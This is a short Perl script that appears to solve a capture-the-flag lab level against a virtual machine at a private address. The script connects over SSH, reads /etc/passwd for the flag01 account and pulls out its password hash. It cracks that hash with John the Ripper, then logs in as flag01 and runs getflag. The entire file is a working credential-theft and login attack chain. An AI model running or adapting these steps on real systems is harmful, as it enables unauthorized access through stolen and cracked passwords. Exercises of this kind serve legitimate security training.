#!/usr/bin/perl

$ip = @ARGV ? $ARGV[0] : "192.168.56.2";
$passwd = "cat /etc/passwd | grep flag01";
$input = `ssh -qp 4242 level01\@$ip '$passwd'`;
@split = split(':', $input);
$pass = $split[1];
print "$passwd\n", $input, , "$pass\n", `echo $pass > pass ; john pass --show | head -n 1 && rm pass`;
system("ssh -qp 4242 flag01\@$ip 'getflag'");
